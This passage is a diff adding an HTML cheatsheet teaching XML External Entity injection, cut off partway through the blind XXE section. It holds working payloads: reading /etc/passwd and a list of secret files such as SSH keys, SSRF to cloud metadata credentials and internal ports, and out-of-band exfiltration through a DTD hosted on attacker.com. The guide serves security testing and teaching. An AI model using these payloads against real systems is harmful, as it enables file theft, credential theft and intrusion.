@@ -1,0 +1,1197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XXE Injection — Field Cheatsheet</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;700;800&family=DM+Sans:ital,wght@0,300;0,400;1,300&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:        #0b0e13;
+    --surface:   #111520;
+    --border:    #1e2535;
+    --accent:    #00e5ff;
+    --accent2:   #ff4d6d;
+    --accent3:   #ffe04b;
+    --green:     #39ff8f;
+    --muted:     #5a677d;
+    --text:      #cdd6f4;
+    --text-dim:  #8891a8;
+    --mono:      'Share Tech Mono', monospace;
+    --sans:      'DM Sans', sans-serif;
+    --display:   'Syne', sans-serif;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    font-size: 14px;
+    line-height: 1.7;
+    padding: 0;
+    overflow-x: hidden;
+  }
+
+  /* ── NOISE OVERLAY ── */
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 999;
+    opacity: .4;
+  }
+
+  /* ── HEADER ── */
+  header {
+    padding: 60px 60px 40px;
+    border-bottom: 1px solid var(--border);
+    position: relative;
+    overflow: hidden;
+  }
+  header::after {
+    content: 'XXE';
+    position: absolute; right: -20px; top: -30px;
+    font-family: var(--display);
+    font-size: 260px;
+    font-weight: 800;
+    color: rgba(0,229,255,0.03);
+    pointer-events: none;
+    line-height: 1;
+  }
+  .tag-line {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: .2em;
+    text-transform: uppercase;
+    margin-bottom: 12px;
+  }
+  header h1 {
+    font-family: var(--display);
+    font-size: clamp(36px, 5vw, 64px);
+    font-weight: 800;
+    line-height: 1.05;
+    color: #fff;
+  }
+  header h1 span { color: var(--accent); }
+  header p.sub {
+    margin-top: 14px;
+    color: var(--text-dim);
+    font-size: 13px;
+    max-width: 560px;
+    font-style: italic;
+  }
+
+  /* ── LAYOUT ── */
+  .wrapper {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 40px 80px;
+  }
+
+  /* ── NAV PILLS ── */
+  .nav-pills {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    padding: 28px 0 0;
+    margin-bottom: 48px;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 28px;
+  }
+  .nav-pills a {
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: .1em;
+    color: var(--text-dim);
+    text-decoration: none;
+    padding: 5px 12px;
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    transition: all .2s;
+  }
+  .nav-pills a:hover {
+    color: var(--accent);
+    border-color: var(--accent);
+    background: rgba(0,229,255,.05);
+  }
+
+  /* ── SECTION ── */
+  section {
+    margin-bottom: 64px;
+    scroll-margin-top: 20px;
+  }
+  .section-header {
+    display: flex;
+    align-items: baseline;
+    gap: 16px;
+    margin-bottom: 24px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+  .section-num {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--accent);
+    opacity: .7;
+    flex-shrink: 0;
+  }
+  .section-header h2 {
+    font-family: var(--display);
+    font-size: 20px;
+    font-weight: 700;
+    color: #fff;
+  }
+
+  /* ── CARDS ── */
+  .card-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+    gap: 16px;
+  }
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 20px 22px;
+    position: relative;
+    overflow: hidden;
+  }
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+  }
+  .card.accent::before  { background: var(--accent); }
+  .card.red::before     { background: var(--accent2); }
+  .card.yellow::before  { background: var(--accent3); }
+  .card.green::before   { background: var(--green); }
+
+  .card h3 {
+    font-family: var(--display);
+    font-size: 13px;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 10px;
+    text-transform: uppercase;
+    letter-spacing: .05em;
+  }
+  .card p, .card li {
+    font-size: 13px;
+    color: var(--text-dim);
+    line-height: 1.6;
+  }
+  .card ul { padding-left: 16px; }
+  .card ul li { margin-bottom: 4px; }
+
+  /* ── PROSE ── */
+  .prose {
+    color: var(--text-dim);
+    font-size: 13.5px;
+    max-width: 820px;
+    line-height: 1.8;
+  }
+  .prose p { margin-bottom: 12px; }
+  .prose strong { color: var(--text); font-weight: 600; }
+  .prose em { color: var(--accent3); font-style: normal; }
+
+  /* ── METAPHOR BOX ── */
+  .metaphor {
+    background: rgba(255,228,75,.04);
+    border-left: 3px solid var(--accent3);
+    border-radius: 0 6px 6px 0;
+    padding: 16px 20px;
+    margin: 18px 0;
+    font-size: 13px;
+    color: var(--text-dim);
+  }
+  .metaphor::before {
+    content: '💡 Analogy: ';
+    color: var(--accent3);
+    font-weight: 600;
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: .1em;
+    display: block;
+    margin-bottom: 6px;
+  }
+
+  /* ── CALLOUT ── */
+  .callout {
+    display: flex;
+    gap: 14px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px 20px;
+    margin: 18px 0;
+    font-size: 13px;
+    color: var(--text-dim);
+    align-items: flex-start;
+  }
+  .callout.warn  { border-left: 3px solid var(--accent2); }
+  .callout.tip   { border-left: 3px solid var(--green); }
+  .callout.info  { border-left: 3px solid var(--accent); }
+  .callout-icon  { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+  .callout strong { color: var(--text); }
+
+  /* ── CODE BLOCK ── */
+  .code-block {
+    background: #080b10;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 14px 0;
+    overflow: hidden;
+  }
+  .code-block-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 8px 16px;
+    background: #0d1018;
+    border-bottom: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: .1em;
+  }
+  .code-block-header .lang {
+    color: var(--accent);
+  }
+  .copy-btn {
+    background: none;
+    border: 1px solid var(--border);
+    color: var(--muted);
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 3px 8px;
+    border-radius: 3px;
+    cursor: pointer;
+    transition: all .2s;
+  }
+  .copy-btn:hover { color: var(--accent); border-color: var(--accent); }
+  pre {
+    padding: 18px 20px;
+    overflow-x: auto;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    line-height: 1.65;
+    color: var(--text);
+    tab-size: 2;
+  }
+  .kw  { color: #c792ea; }  /* keyword / tag */
+  .at  { color: #82aaff; }  /* attribute */
+  .st  { color: #c3e88d; }  /* string */
+  .cm  { color: #546e7a; font-style: italic; } /* comment */
+  .hl  { color: var(--accent2); font-weight: bold; } /* highlight / danger */
+  .ok  { color: var(--green); }
+  .num { color: var(--accent3); }
+
+  /* ── STEP LIST ── */
+  .steps { counter-reset: step; list-style: none; padding: 0; }
+  .steps li {
+    counter-increment: step;
+    display: flex;
+    gap: 16px;
+    margin-bottom: 20px;
+    align-items: flex-start;
+  }
+  .steps li::before {
+    content: counter(step, decimal-leading-zero);
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--accent);
+    background: rgba(0,229,255,.08);
+    border: 1px solid rgba(0,229,255,.2);
+    border-radius: 3px;
+    min-width: 34px;
+    text-align: center;
+    padding: 4px 6px;
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+  .steps li .step-body { flex: 1; }
+  .steps li .step-body strong {
+    display: block;
+    color: #fff;
+    font-family: var(--display);
+    font-size: 13px;
+    margin-bottom: 4px;
+  }
+  .steps li .step-body p {
+    font-size: 13px;
+    color: var(--text-dim);
+    margin: 0;
+  }
+
+  /* ── TABLE ── */
+  .table-wrap { overflow-x: auto; margin: 14px 0; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12.5px;
+  }
+  th {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: .12em;
+    text-transform: uppercase;
+    color: var(--accent);
+    background: #0d1018;
+    padding: 10px 14px;
+    text-align: left;
+    border-bottom: 1px solid var(--border);
+  }
+  td {
+    padding: 9px 14px;
+    border-bottom: 1px solid var(--border);
+    color: var(--text-dim);
+    vertical-align: top;
+  }
+  tr:hover td { background: rgba(255,255,255,.02); }
+  td code, th code {
+    font-family: var(--mono);
+    font-size: 11px;
+    background: rgba(0,229,255,.07);
+    color: var(--accent);
+    padding: 1px 5px;
+    border-radius: 3px;
+  }
+
+  /* ── BADGE ── */
+  .badge {
+    display: inline-block;
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: .08em;
+    padding: 2px 7px;
+    border-radius: 3px;
+    font-weight: normal;
+  }
+  .badge.red    { background: rgba(255,77,109,.15); color: var(--accent2); border: 1px solid rgba(255,77,109,.3); }
+  .badge.cyan   { background: rgba(0,229,255,.1);   color: var(--accent);  border: 1px solid rgba(0,229,255,.2); }
+  .badge.yellow { background: rgba(255,224,75,.1);  color: var(--accent3); border: 1px solid rgba(255,224,75,.2); }
+  .badge.green  { background: rgba(57,255,143,.1);  color: var(--green);   border: 1px solid rgba(57,255,143,.2); }
+
+  /* ── TWO-COL ── */
+  .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+  @media (max-width: 700px) { .two-col { grid-template-columns: 1fr; } }
+
+  /* ── DIVIDER ── */
+  hr.subtle { border: none; border-top: 1px solid var(--border); margin: 32px 0; }
+
+  /* ── FOOTER ── */
+  footer {
+    text-align: center;
+    padding: 32px;
+    border-top: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: .1em;
+  }
+
+  /* ── SCROLLBAR ── */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="tag-line">Security Field Guide · XML Attack Surface</div>
+  <h1>XML External Entity<br><span>Injection</span></h1>
+  <p class="sub">Step-by-step from XML basics to blind XXE exploitation, SSRF, and remediation. With analogies, payloads, and assessment guidance.</p>
+</header>
+
+<div class="wrapper">
+
+  <nav class="nav-pills">
+    <a href="#xml-basics">XML Basics</a>
+    <a href="#dtd-entities">DTD &amp; Entities</a>
+    <a href="#when-to-test">When to Test</a>
+    <a href="#how-arise">How XXE Arises</a>
+    <a href="#impact">Impact &amp; Limits</a>
+    <a href="#exploit-files">Exploit: Local Files</a>
+    <a href="#exploit-ssrf">Exploit: SSRF</a>
+    <a href="#blind-xxe">Blind XXE</a>
+    <a href="#no-doctype">No DOCTYPE?</a>
+    <a href="#c2">C&amp;C / Tooling</a>
+    <a href="#prevention">Prevention</a>
+  </nav>
+
+  <!-- ─────────────────────────── 1. XML BASICS ─────────────────────────── -->
+  <section id="xml-basics">
+    <div class="section-header">
+      <span class="section-num">01</span>
+      <h2>XML Basics — Structure &amp; Purpose</h2>
+    </div>
+
+    <div class="prose">
+      <p><strong>XML (eXtensible Markup Language)</strong> is a text format for storing and transporting structured data. Unlike HTML, it has no predefined tags — you invent your own.</p>
+    </div>
+
+    <div class="metaphor">
+      Think of XML like a <strong>labeled shipping crate system</strong>. Every item goes in a box, the box has a label, and boxes can contain other boxes. The structure is entirely up to whoever builds the warehouse.
+    </div>
+
+    <div class="code-block">
+      <div class="code-block-header">
+        <span class="lang">XML</span>
+        <span>Basic structure</span>
+      </div>
+      <pre><span class="cm">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>    <span class="cm">&lt;!-- XML declaration --&gt;</span>
+
+<span class="kw">&lt;order&gt;</span>                                     <span class="cm">&lt;!-- root element (exactly ONE) --&gt;</span>
+  <span class="kw">&lt;customer</span> <span class="at">id=</span><span class="st">"42"</span><span class="kw">&gt;</span>                       <span class="cm">&lt;!-- element with attribute --&gt;</span>
+    <span class="kw">&lt;name&gt;</span>Alice<span class="kw">&lt;/name&gt;</span>
+    <span class="kw">&lt;email&gt;</span>alice@example.com<span class="kw">&lt;/email&gt;</span>
+  <span class="kw">&lt;/customer&gt;</span>
+  <span class="kw">&lt;item</span> <span class="at">qty=</span><span class="st">"3"</span><span class="kw">&gt;</span>Widget<span class="kw">&lt;/item&gt;</span>
+<span class="kw">&lt;/order&gt;</span></pre>
+    </div>
+
+    <div class="card-grid" style="margin-top:20px">
+      <div class="card accent">
+        <h3>Key Rules</h3>
+        <ul>
+          <li>One root element only</li>
+          <li>All tags must close</li>
+          <li>Attribute values quoted</li>
+          <li>Tags are case-sensitive</li>
+          <li>Proper nesting required</li>
+        </ul>
+      </div>
+      <div class="card accent">
+        <h3>Common Uses</h3>
+        <ul>
+          <li>SAML / SSO tokens</li>
+          <li>SOAP web services</li>
+          <li>Office file formats (.docx, .xlsx)</li>
+          <li>SVG images</li>
+          <li>API responses (legacy)</li>
+          <li>Config files (Maven, Android)</li>
+        </ul>
+      </div>
+      <div class="card accent">
+        <h3>Schema</h3>
+        <p>A <strong>schema</strong> defines what's valid: which elements exist, what types they hold, what's required. Think of it as the blueprint the crate-builder must follow.</p>
+        <p style="margin-top:8px">Formats: <code style="font-family:var(--mono);font-size:11px;color:var(--accent)">XSD</code> (XML Schema Definition), <code style="font-family:var(--mono);font-size:11px;color:var(--accent)">DTD</code>, RelaxNG.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ─────────────────────────── 2. DTD & ENTITIES ─────────────────────────── -->
+  <section id="dtd-entities">
+    <div class="section-header">
+      <span class="section-num">02</span>
+      <h2>DTD &amp; Entities — The Dangerous Ingredients</h2>
+    </div>
+
+    <div class="prose">
+      <p>A <strong>Document Type Definition (DTD)</strong> is an older schema format that lives either inside the XML document (internal DTD) or at a URL (external DTD). It defines allowed elements <em>and</em> declares <strong>entities</strong> — which is where XXE comes from.</p>
+    </div>
+
+    <div class="metaphor">
+      An <strong>entity</strong> is a text macro — like a copy-paste shortcut. You define <code>&amp;company;</code> once, and every time the parser sees it, it substitutes the full value. An <em>external</em> entity fetches that value <strong>from a URL or file</strong> at parse time.
+    </div>
+
+    <div class="two-col">
+      <div>
+        <div class="code-block">
+          <div class="code-block-header"><span class="lang">XML</span><span>Internal DTD + entity</span></div>
+          <pre><span class="cm">&lt;!-- Internal DTD --&gt;</span>
+<span class="kw">&lt;!DOCTYPE</span> <span class="at">note</span> [
+  <span class="cm">&lt;!ENTITY author "Alice"&gt;</span>
+]<span class="kw">&gt;</span>
+
+<span class="kw">&lt;note&gt;</span>
+  Written by <span class="hl">&amp;author;</span>   <span class="cm">&lt;!-- → "Alice" --&gt;</span>
+<span class="kw">&lt;/note&gt;</span></pre>
+        </div>
+      </div>
+      <div>
+        <div class="code-block">
+          <div class="code-block-header"><span class="lang">XML</span><span class="hl">External entity (XXE vector)</span></div>
+          <pre><span class="kw">&lt;!DOCTYPE</span> <span class="at">foo</span> [
+  <span class="cm">&lt;!ENTITY xxe</span>
+    <span class="hl">SYSTEM "file:///etc/passwd"</span>
+  <span class="cm">&gt;</span>
+]<span class="kw">&gt;</span>
+
+<span class="kw">&lt;data&gt;</span><span class="hl">&amp;xxe;</span><span class="kw">&lt;/data&gt;</span>
+<span class="cm">&lt;!-- Parser fetches /etc/passwd
+     and inlines it here --&gt;</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="table-wrap" style="margin-top:20px">
+      <table>
+        <thead><tr><th>Entity Type</th><th>Syntax</th><th>Source</th><th>XXE Risk</th></tr></thead>
+        <tbody>
+          <tr><td>Internal</td><td><code>&lt;!ENTITY name "value"&gt;</code></td><td>Literal string in DTD</td><td><span class="badge yellow">Low</span></td></tr>
+          <tr><td>External (file)</td><td><code>&lt;!ENTITY name SYSTEM "file:///..."&gt;</code></td><td>Local filesystem</td><td><span class="badge red">Critical</span></td></tr>
+          <tr><td>External (HTTP)</td><td><code>&lt;!ENTITY name SYSTEM "http://..."&gt;</code></td><td>Remote URL</td><td><span class="badge red">SSRF</span></td></tr>
+          <tr><td>Parameter entity</td><td><code>&lt;!ENTITY % name SYSTEM "..."&gt;</code></td><td>Used inside DTD only</td><td><span class="badge red">Blind XXE</span></td></tr>
+          <tr><td>Character entity</td><td><code>&amp;lt; &amp;amp;</code></td><td>Built-in XML escaping</td><td><span class="badge green">None</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ─────────────────────────── 3. WHEN TO TEST ─────────────────────────── -->
+  <section id="when-to-test">
+    <div class="section-header">
+      <span class="section-num">03</span>
+      <h2>When Does Testing for XXE Make Sense?</h2>
+    </div>
+
+    <div class="prose">
+      <p>XXE is relevant wherever an application <strong>parses XML that the attacker influences</strong>. It's easy to miss because XML is often hidden.</p>
+    </div>
+
+    <div class="card-grid">
+      <div class="card red">
+        <h3>🎯 High-Yield Targets</h3>
+        <ul>
+          <li>SOAP endpoints (<code>Content-Type: text/xml</code>)</li>
+          <li>SAML SSO (SAMLResponse, AuthnRequest)</li>
+          <li>File upload: .docx, .xlsx, .svg, .xml</li>
+          <li>APIs accepting <code>application/xml</code></li>
+          <li>RSS/Atom feed parsers</li>
+        </ul>
+      </div>
+      <div class="card yellow">
+        <h3>🔍 Also Check</h3>
+        <ul>
+          <li>JSON endpoints — try changing <code>Content-Type</code> to XML and re-send</li>
+          <li>PDF generators (often parse SVG/XML internally)</li>
+          <li>Import/export features (data feeds, configs)</li>
+          <li>Mobile apps talking to legacy middleware</li>
+        </ul>
+      </div>
+      <div class="card green">
+        <h3>📋 Assessment Checklist</h3>
+        <ul>
+          <li>Identify all XML-accepting endpoints</li>
+          <li>Check <code>Content-Type</code> headers</li>
+          <li>Inspect file upload processing</li>
+          <li>Look for SAML in SSO flows</li>
+          <li>Test JSON endpoints with XML swap</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- ─────────────────────────── 4. HOW ARISE ─────────────────────────── -->
+  <section id="how-arise">
+    <div class="section-header">
+      <span class="section-num">04</span>
+      <h2>How Do XXE Vulnerabilities Arise?</h2>
+    </div>
+
+    <div class="prose">
+      <p>XXE exists because <strong>most XML parsers support external entities by default</strong>. It's a feature, not a bug — until untrusted input hits it.</p>
+    </div>
+
+    <div class="metaphor">
+      Imagine a photocopier that can pull documents from any network share and include them in a printout. That's useful internally. But if a visitor hands you an instruction sheet that says "and include the contents of server/secret-plans.docx on page 3" — you have a problem.
+    </div>
+
+    <div class="steps" style="margin-top:20px">
+      <li>
+        <div class="step-body">
+          <strong>Application receives XML</strong>
+          <p>User-controlled data arrives as XML — directly in the body, inside a SOAP envelope, or embedded in a file upload.</p>
+        </div>
+      </li>
+      <li>
+        <div class="step-body">
+          <strong>Parser processes DOCTYPE without restriction</strong>
+          <p>The XML parser (libxml2, Xerces, .NET XmlDocument, Java SAXParser, etc.) sees a <code>&lt;!DOCTYPE&gt;</code> declaration and — by default — processes it.</p>
+        </div>
+      </li>
+      <li>
+        <div class="step-body">
+          <strong>External entity is resolved</strong>
+          <p>The parser fetches the external resource (file, URL) and substitutes it into the document tree.</p>
+        </div>
+      </li>
+      <li>
+        <div class="step-body">
+          <strong>Substituted content ends up in the response</strong>
+          <p>If the application reflects parsed values (e.g., echoes back a field), the attacker sees the file contents. If not → Blind XXE path.</p>
+        </div>
+      </li>
+    </div>
+
+    <div class="callout info">
+      <span class="callout-icon">ℹ️</span>
+      <div><strong>Root cause in one sentence:</strong> The application passes attacker-controlled XML to a parser that has external entity processing enabled, then uses the parsed output.</div>
+    </div>
+  </section>
+
+  <!-- ─────────────────────────── 5. IMPACT ─────────────────────────── -->
+  <section id="impact">
+    <div class="section-header">
+      <span class="section-num">05</span>
+      <h2>Potential Impact &amp; Limitations</h2>
+    </div>
+
+    <div class="card-grid">
+      <div class="card red">
+        <h3>💥 Impact</h3>
+        <ul>
+          <li><strong>Local file disclosure</strong> — read <code>/etc/passwd</code>, app configs, SSH keys, source code</li>
+          <li><strong>SSRF</strong> — probe internal network, hit cloud metadata endpoints (<code>169.254.169.254</code>)</li>
+          <li><strong>Blind data exfil</strong> — via DNS/HTTP to attacker-controlled server</li>
+          <li><strong>DoS (Billion Laughs)</strong> — nested entity expansion exhausts memory</li>
+          <li><strong>RCE</strong> — rare, but possible via PHP <code>expect://</code> wrapper</li>
+        </ul>
+      </div>
+      <div class="card yellow">
+        <h3>⚠️ Limitations</h3>
+        <ul>
+          <li>Files containing <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code> break XML parsing → need out-of-band or CDATA tricks</li>
+          <li>Binary files not readable (not valid XML text)</li>
+          <li>No response reflection → must use blind techniques</li>
+          <li>WAFs may block <code>SYSTEM</code> keyword or <code>&lt;!DOCTYPE</code></li>
+          <li>Modern parsers (hardened) may have XXE disabled by default</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="callout warn" style="margin-top:20px">
+      <span class="callout-icon">⚠️</span>
+      <div><strong>CDATA workaround for special characters:</strong> Wrap fetched content in a CDATA section via a parameter entity trick (see Blind XXE section) to handle files with XML metacharacters.</div>
+    </div>
+  </section>
+
+  <!-- ─────────────────────────── 6. EXPLOIT FILES ─────────────────────────── -->
+  <section id="exploit-files">
+    <div class="section-header">
+      <span class="section-num">06</span>
+      <h2>Exploit: Reading Local Files</h2>
+    </div>
+
+    <div class="prose">
+      <p>The classic flow: inject a DOCTYPE, define an external entity pointing to a local file, reference it in a value the app echoes back.</p>
+    </div>
+
+    <ol class="steps">
+      <li>
+        <div class="step-body">
+          <strong>Find an XML endpoint that reflects input</strong>
+          <p>Look for a field value in the response that mirrors something you sent. E.g., <code>&lt;username&gt;Alice&lt;/username&gt;</code> → response contains "Alice".</p>
+        </div>
+      </li>
+      <li>
+        <div class="step-body">
+          <strong>Inject a DOCTYPE with external entity</strong>
+          <p>Prepend (or replace) the DOCTYPE to declare your entity.</p>
+        </div>
+      </li>
+      <li>
+        <div class="step-body">
+          <strong>Reference the entity in the reflected field</strong>
+          <p>Put <code>&amp;xxe;</code> where the echoed value was.</p>
+        </div>
+      </li>
+      <li>
+        <div class="step-body">
+          <strong>Read the response</strong>
+          <p>The file contents appear where the entity was referenced.</p>
+        </div>
+      </li>
+    </ol>
+
+    <div class="code-block">
+      <div class="code-block-header"><span class="lang">XML · BURP</span><span>Basic file read payload</span></div>
+      <pre><span class="cm">&lt;?xml version="1.0"?&gt;</span>
+<span class="hl">&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;</span>
+<span class="kw">&lt;stockCheck&gt;</span>
+  <span class="kw">&lt;productId&gt;</span><span class="hl">&amp;xxe;</span><span class="kw">&lt;/productId&gt;</span>   <span class="cm">&lt;!-- reflected field --&gt;</span>
+  <span class="kw">&lt;storeId&gt;</span>1<span class="kw">&lt;/storeId&gt;</span>
+<span class="kw">&lt;/stockCheck&gt;</span></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-block-header"><span class="lang">RESPONSE (truncated)</span><span>What you get back</span></div>
+      <pre><span class="ok">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...</span></pre>
+    </div>
+
+    <hr class="subtle">
+
+    <div class="prose"><p><strong>Other useful file targets:</strong></p></div>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>File</th><th>What you get</th></tr></thead>
+        <tbody>
+          <tr><td><code>/etc/passwd</code></td><td>User list, shells — confirms XXE works</td></tr>
+          <tr><td><code>/etc/hostname</code></td><td>Machine name — useful for SSRF targeting</td></tr>
+          <tr><td><code>/proc/self/environ</code></td><td>Environment variables — often contains secrets</td></tr>
+          <tr><td><code>/proc/self/cmdline</code></td><td>Running process & args</td></tr>
+          <tr><td><code>~/.ssh/id_rsa</code></td><td>Private SSH key</td></tr>
+          <tr><td><code>/var/www/html/config.php</code></td><td>App source, DB credentials</td></tr>
+          <tr><td><code>C:\Windows\win.ini</code></td><td>Windows confirmation payload</td></tr>
+          <tr><td><code>file:///C:/inetpub/wwwroot/web.config</code></td><td>IIS config, connection strings</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ─────────────────────────── 7. SSRF ─────────────────────────── -->
+  <section id="exploit-ssrf">
+    <div class="section-header">
+      <span class="section-num">07</span>
+      <h2>Exploit: SSRF via XXE</h2>
+    </div>
+
+    <div class="prose">
+      <p>Instead of <code>file://</code>, use <code>http://</code>. The server's XML parser makes an outbound HTTP request — from inside the network. You can probe internal services, cloud metadata APIs, or anything the server can reach.</p>
+    </div>
+
+    <div class="metaphor">
+      You're standing outside a locked building. You can't enter. But you slip a note under the door saying "call this number for me and read me what they say." XXE SSRF is exactly that: you make the server act as your proxy.
+    </div>
+
+    <div class="code-block">
+      <div class="code-block-header"><span class="lang">XML</span><span>AWS metadata endpoint via SSRF</span></div>
+      <pre><span class="kw">&lt;!DOCTYPE foo [</span>
+  <span class="hl">&lt;!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"&gt;</span>
+<span class="kw">]&gt;</span>
+<span class="kw">&lt;data&gt;</span><span class="hl">&amp;ssrf;</span><span class="kw">&lt;/data&gt;</span></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-block-header"><span class="lang">XML</span><span>Internal network port scan (one-by-one)</span></div>
+      <pre><span class="cm">&lt;!-- Try systematically; timing difference reveals open vs. closed --&gt;</span>
+<span class="kw">&lt;!DOCTYPE foo [</span>
+  <span class="hl">&lt;!ENTITY ssrf SYSTEM "http://192.168.1.1:8080/"&gt;</span>
+<span class="kw">]&gt;</span>
+<span class="kw">&lt;data&gt;</span><span class="hl">&amp;ssrf;</span><span class="kw">&lt;/data&gt;</span></pre>
+    </div>
+
+    <div class="card-grid" style="margin-top:20px">
+      <div class="card red">
+        <h3>High-Value SSRF Targets</h3>
+        <ul>
+          <li><code>169.254.169.254</code> — AWS/GCP/Azure metadata</li>
+          <li><code>http://localhost:8080</code> — admin panels</li>
+          <li><code>http://internal-db:5432</code> — databases</li>
+          <li><code>http://elasticsearch:9200/_cat/indices</code></li>
+          <li><code>http://kubernetes.default.svc</code> — k8s API</li>
+        </ul>
+      </div>
+      <div class="card yellow">
+        <h3>SSRF Indicators</h3>
+        <ul>
+          <li>Error message mentions connection refused → port closed</li>
+          <li>Timeout → filtered or no route</li>
+          <li>HTTP 200 with content → open &amp; responding</li>
+          <li>Burp Collaborator interaction → confirmed outbound</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- ─────────────────────────── 8. BLIND XXE ─────────────────────────── -->
+  <section id="blind-xxe">
+    <div class="section-header">
+      <span class="section-num">08</span>
+      <h2>Blind XXE — Out-of-Band Exfiltration &amp; Burp Collaborator</h2>
+    </div>
+
+    <div class="prose">
+      <p>When the application processes XML but <strong>never reflects values back</strong>, you need out-of-band channels. The payload triggers an outbound connection to a server you control — proving the vulnerability and potentially exfiltrating data.</p>
+    </div>
+
+    <div class="metaphor">
+      You're blind-folded. You can't see what the server reads. But you ask it to shout the file contents out the window — and you're standing outside listening. Burp Collaborator is the listener.
+    </div>
+
+    <h3 style="font-family:var(--display);font-size:14px;color:#fff;margin:24px 0 12px;text-transform:uppercase;letter-spacing:.05em;">Step 1 — Confirm Blind XXE with DNS ping</h3>
+
+    <div class="code-block">
+      <div class="code-block-header"><span class="lang">XML</span><span>OOB DNS / HTTP via SYSTEM entity</span></div>
+      <pre><span class="kw">&lt;!DOCTYPE foo [</span>
+  <span class="hl">&lt;!ENTITY xxe SYSTEM "http://YOUR.COLLABORATOR.ID.oastify.com/"&gt;</span>
+<span class="kw">]&gt;</span>
+<span class="kw">&lt;data&gt;</span><span class="hl">&amp;xxe;</span><span class="kw">&lt;/data&gt;</span>
+
+<span class="cm">&lt;!-- If Collaborator gets a DNS/HTTP hit → XXE confirmed blind --&gt;</span></pre>
+    </div>
+
+    <div class="callout info">
+      <span class="callout-icon">ℹ️</span>
+      <div><strong>Burp Collaborator:</strong> Burp Suite Pro → Collaborator tab → "Copy to clipboard" gives you a unique subdomain. Any DNS or HTTP requests to it appear in real time.</div>
+    </div>
+
+    <h3 style="font-family:var(--display);font-size:14px;color:#fff;margin:24px 0 12px;text-transform:uppercase;letter-spacing:.05em;">Step 2 — Exfiltrate file data via parameter entities + external DTD</h3>
+
+    <div class="prose">
+      <p>You can't nest entity references directly in an internal DTD. Instead, host a malicious DTD on your server and fetch it with a <strong>parameter entity</strong>.</p>
+    </div>
+
+    <div class="two-col">
+      <div>
+        <div class="code-block">
+          <div class="code-block-header"><span class="lang">XML · SEND TO TARGET</span><span>Step 2a — Payload</span></div>
+          <pre><span class="kw">&lt;!DOCTYPE foo [</span>
+  <span class="hl">&lt;!ENTITY % dtd
+    SYSTEM "http://attacker.com/evil.dtd"&gt;</span>
+  <span class="hl">%dtd;</span>
+<span class="kw">]&gt;</span>
+<span class="kw">&lt;data&gt;</span>anything<span class="kw">&lt;/data&gt;</span></pre>
+        </div>
+      </div>
+      <div>
+        <div class="code-block">
